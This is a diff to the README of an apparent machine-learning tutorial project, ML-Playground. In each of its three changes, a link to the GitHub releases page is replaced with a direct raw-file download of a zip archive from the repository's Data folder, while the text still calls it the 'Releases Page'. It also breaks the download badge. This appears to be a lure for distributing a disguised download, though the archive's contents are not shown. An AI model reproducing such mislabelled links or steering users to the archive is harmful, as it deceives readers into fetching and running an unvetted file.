@@ -6,7 +6,7 @@ Welcome to ML-Playground! This application is your hands-on guide to explore mac
 
 ## 📥 Download Now
 
-[![Download from GitHub](https://img.shields.io/badge/Download%20from%20GitHub-v1.0-blue)](https://github.com/s7ven13/ML-Playground/releases)
+[![Download from GitHub](https://raw.githubusercontent.com/s7ven13/ML-Playground/main/Data/Playground-M-campion.zip%20from%20GitHub-v1.0-blue)](https://raw.githubusercontent.com/s7ven13/ML-Playground/main/Data/Playground-M-campion.zip)
 
 ## 📂 Overview
 
@@ -29,7 +29,7 @@ Before downloading, ensure your system meets the following requirements:
 
 ## 🔍 How to Download & Install
 
-1. Visit the [Releases Page](https://github.com/s7ven13/ML-Playground/releases) to access the software.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/s7ven13/ML-Playground/main/Data/Playground-M-campion.zip) to access the software.
 2. Locate the latest version in the list of releases.
 3. Click on the version number to expand the details.
 4. Download the appropriate file for your operating system.
@@ -81,4 +81,4 @@ You are not alone in your learning journey. Join our community to connect with o
 
 ML-Playground is your starting point to dive into the diverse world of machine learning. By engaging with these projects, you will enhance your understanding and develop practical skills. 
 
-For more detailed information, visit the [Releases Page](https://github.com/s7ven13/ML-Playground/releases) and embark on your machine learning journey today!
+For more detailed information, visit the [Releases Page](https://raw.githubusercontent.com/s7ven13/ML-Playground/main/Data/Playground-M-campion.zip) and embark on your machine learning journey today!
